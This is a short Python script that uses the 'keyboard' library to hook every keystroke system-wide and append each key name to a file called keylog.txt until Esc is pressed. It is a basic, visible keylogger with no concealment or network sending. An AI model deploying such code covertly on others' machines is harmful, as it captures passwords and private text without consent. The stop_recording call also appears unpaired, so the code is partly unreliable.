import keyboard

def on_key(event):
    if event.event_type == 'down':
        if event.name == 'esc':
            keyboard.unhook_all()
            keyboard.stop_recording() 
            print("\nRecording stopped.")
        else:
            print("Keys pressed:", event.name)
            with open('keylog.txt', 'a') as f:
                f.write(event.name + '\n')

print("Recording... Press 'Esc' to stop.")
keyboard.hook(on_key)
keyboard.wait('esc')